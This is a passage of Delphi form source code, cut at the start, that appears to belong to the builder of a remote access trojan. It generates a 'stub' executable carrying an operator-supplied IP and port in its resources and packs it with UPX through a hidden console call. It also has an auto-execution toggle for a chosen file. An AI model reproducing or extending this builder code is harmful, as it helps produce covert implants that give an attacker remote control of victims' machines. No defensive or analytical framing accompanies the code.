    var CmdParams: string := '--best --compress-exports=1 "' + TempStubPath + '"';
    //  var CmdParams: string := '--ultra-brute --best --lzma --compress-exports=1 --compress-icons=3 --compress-resources=1 "' + TempStubPath + '"';

    // Execute UPX with the appropriate parameters
    if FileExists(UPXPath) then
    begin
        // Hide the console window (SW_HIDE = 0)
        if ShellExecute(0, 'open', PChar(UPXPath), PChar(CmdParams), nil, 0) <= 32 then
            MessageBoxA(0, 'Failed to run UPX packer', 'Error', MB_ICONERROR)
        else
            Application.MessageBox(
  PChar('Stub has been successfully Packed with UPX: '  + TempStubPath),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
    end
    else
        MessageBoxA(0, 'UPX packer (upx32.exe) not found in application directory', 'Error', MB_ICONERROR);
end;



Application.MessageBox(
  PChar('Stub has been successfully created with IP: ' +
        scEdit1.Text + ' and Port: ' + scEdit2.Text + 'Path: ' + TempStubPath),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
    except
      on E: Exception do
      begin
        // Make sure to end the resource update if there's an exception
        EndUpdateResource(ResHandle, TRUE); // TRUE means abandon changes
        ShowMessage('Error during resource update: ' + E.Message);
      end;
    end;
  except
    on E: Exception do
      ShowMessage('Error creating stub: ' + E.Message);
  end;
end;

procedure TForm2.scGPSwitch4ChangeState(Sender: TObject);
begin

 if scEdit4.Text = 'File Path' then
 begin
   MessageBoxA(0, 'Please Choose File Before You Enable Auto Executions', 'Auto', 0);
   Exit;
 end;



if scGPSwitch4.State = scswOn then
begin
AutoExec.Enabled := true;
Application.MessageBox(
  PChar('Auto Execution Started: ' + 'Path: ' + scEdit4.Text),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
end;

if scGPSwitch4.State = scswOff then
begin
AutoExec.Enabled := false;
     Application.MessageBox(
  PChar('Auto Execution Stopped: ' + 'Path: ' + scEdit4.Text),
  'Success',
  MB_OK + MB_ICONINFORMATION
);
end;


end;

procedure TForm2.StartMonitoring;

begin

end;

procedure TForm2.mytimeanddateTimer(Sender: TObject);
begin
 Label8.Caption := FormatDateTime('mm-dd-yyyy', Now);

  // Display time in format HH:MM AM/PM
Label9.Caption := FormatDateTime('hh:nn:ss AM/PM', Now);
end;

procedure TForm2.WMNCHitTest(var Msg: TWMNCHitTest);
begin
  inherited;
  if Msg.Result = HTCLIENT then
    Msg.Result := HTCAPTION;
end;

end.
